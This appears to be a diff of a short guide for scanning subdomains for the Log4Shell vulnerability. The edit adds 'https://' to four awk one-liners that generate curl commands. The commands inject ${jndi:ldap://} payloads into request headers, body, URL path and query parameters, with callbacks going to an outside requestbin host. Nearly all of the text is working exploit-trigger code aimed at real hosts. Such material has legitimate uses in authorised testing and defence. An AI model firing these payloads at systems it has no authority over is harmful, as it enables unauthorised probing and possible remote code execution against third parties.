@@ -3,17 +3,17 @@
 3. Run the below awk scripts against the subdomains.txt 
 
 #Headers
-awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v "$1 " -H '\''User-Agent: ${jndi:ldap://"b[1]".4d2ea.d.requestbin.net}'\'' --connect-timeout 2.3"}' subdomains.txt > run-headers.sh
+awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v https://"$1 " -H '\''User-Agent: ${jndi:ldap://"b[1]".4d2ea.d.requestbin.net}'\'' --connect-timeout 2.3"}' subdomains.txt > run-headers.sh
 
 #Body text
-awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v "$1 " --data '\''${jndi:ldap://"b[1]".4d2ea.d.requestbin.net}'\'' --connect-timeout 2.3"}' subdomains.txt > run-body.sh
+awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v https://"$1 " --data '\''${jndi:ldap://"b[1]".4d2ea.d.requestbin.net}'\'' --connect-timeout 2.3"}' subdomains.txt > run-body.sh
 
 #Url 
-awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v "$1"/${jndi:ldap://"b[1]".4d2ea.d.requestbin.net} --connect-timeout 2.3"}' subdomains.txt > run-urls.sh
+awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v https://"$1"/${jndi:ldap://"b[1]".4d2ea.d.requestbin.net} --connect-timeout 2.3"}' subdomains.txt > run-urls.sh
 
 
 #Query-params
-awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v "$1"?l=${jndi:ldap://"b[1]".4d2ea.d.requestbin.net} --connect-timeout 2.3"}' subdomains.txt > run-query-param.sh
+awk 'BEGIN{a=0;}{a++; split($1,b,".");print "curl -v https://"$1"?l=${jndi:ldap://"b[1]".4d2ea.d.requestbin.net} --connect-timeout 2.3"}' subdomains.txt > run-query-param.sh
 
 
 Monitor the page in step 1 
